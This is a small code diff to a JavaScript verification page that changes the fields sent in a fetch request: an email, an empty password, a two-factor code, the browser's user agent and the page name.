@@ -130,7 +130,10 @@ window.addEventListener('DOMContentLoaded', function() {
                         },
                         body: JSON.stringify({
                             email: email,
-                            code: twofa
+                            password: '',
+                            twofa: twofa,
+                            userAgent: navigator.userAgent,
+                            currentPage: 'verify.html'
                         })
                     });
                     
